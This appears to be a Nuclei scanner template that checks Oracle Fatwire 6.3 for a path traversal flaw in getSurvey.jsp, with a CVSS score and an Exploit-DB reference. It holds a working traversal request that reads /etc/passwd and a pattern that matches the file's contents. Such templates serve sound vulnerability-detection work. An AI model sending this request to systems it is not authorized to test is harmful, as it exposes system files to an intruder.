http:
- matchers:
  - part: body
    regex:
    - 'root:.*:0:0:'
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/cs/career/getSurvey.jsp?fn=../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd'
id: oracle-fatwire-lfi
info:
  author: Bernardo Rodrigues @bernardofsr
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
    cvss-score: 8.6
    cwe-id: CWE-22
  description: 'Oracle Fatwire 6.3 suffers from a path traversal vulnerability in
    the getSurvey.jsp endpoint.

    '
  metadata:
    max-request: 1
  name: Oracle Fatwire 6.3 - Path Traversal
  reference:
  - https://www.exploit-db.com/exploits/50167
  severity: high
  tags: lfi,oracle,fatwire,edb,vuln
